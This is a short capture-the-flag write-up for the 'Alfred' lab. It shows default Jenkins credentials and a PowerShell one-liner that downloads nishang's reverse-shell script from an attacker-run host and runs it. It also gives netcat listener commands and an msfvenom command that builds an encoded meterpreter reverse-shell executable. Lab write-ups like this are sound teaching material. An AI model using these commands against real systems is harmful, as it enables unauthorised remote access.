# Alfred

> Nashia Holloway | April 30th, 2020

## Task 1 Initial Access

**1. How many ports are open?**

There are `3` ports open: 80, 8080, and 3389

**2. What is the username and password to login?**

`admin:admin`

**3. Find a feature of the tool that allows you to execute commands on the underlying system. Get a reverse shell this way.**

The feature is located in http://$IP:8080/job/project/configure. Next we need to create an http server with python. Need to use [nishang](https://github.com/samratashok/nishang).

```
python3 -m http.server 8000 --bind $IP
(in new tab)
nc -lvnp 9000
```

Code for web app:
```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

It took a while to figure out why the python server wasn't serving the powershell file. After binding to my specific port and IP instead of the default, it worked.

## Task 2 Switching Shells

Switch to a metepreter shell to make prive esc easier.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$IP LPORT=1337 -f exe -o shell.exe
```

